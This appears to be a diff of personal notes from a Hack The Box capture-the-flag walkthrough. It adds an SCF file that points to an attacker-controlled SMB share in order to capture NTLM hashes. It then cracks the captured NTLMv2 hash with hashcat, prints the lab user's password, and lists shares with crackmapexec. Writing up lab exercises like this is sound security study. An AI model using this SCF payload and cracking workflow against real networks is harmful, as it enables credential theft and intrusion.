@@ -4,6 +4,14 @@ However even if a file share doesn’t contain any data that could be used to co
 smb-share-scf-file attacks
 ```
 
+@scf_attack.scf
+```
+[Shell]
+Command=2
+IconFile=\\10.10.16.5\share\scf.ico
+[Taskbar]
+Command=ToggleDesktop
+```
 
 Keep in mind that we have to turn SMB and HTTP on in order to get the hashes
 ```
@@ -19,3 +27,41 @@ amanda::HTB:5165db0c61c9befc:5E88322BD4CC4F3272FB6958A1E7637C:010100000000000080
 
 Let's crack the hash using hashcat
 
+```
+hashcat --help | grep NTLM
+```
+![[Pasted image 20240408011837.png]]
+
+
+We know that the version of hash is NTLMV2 which is either 5600 or 27100 so will go with 5600 as we already know about it
+```
+.\hashcat.exe -m 5600 -a 0 -D 2 .\hashes4.txt .\rockyou.txt -O
+```
+![[Pasted image 20240408012428.png]]
+
+So we got a user and password
+```
+AMANDA
+```
+
+```
+Ashare1972
+```
+
+So what is the 1st thing comes to my mind is 
+SMB
+srvcert
+so many things will go one by one
+
+```
+http://10.10.10.103/certsrv/
+```
+![[Pasted image 20240408012748.png]]
+
+
+```
+cme smb 10.10.10.103 -u 'AMANDA' -p 'Ashare1972' --shares
+```
+![[Pasted image 20240408012930.png]]
+
+We got a low level use as we got the read access
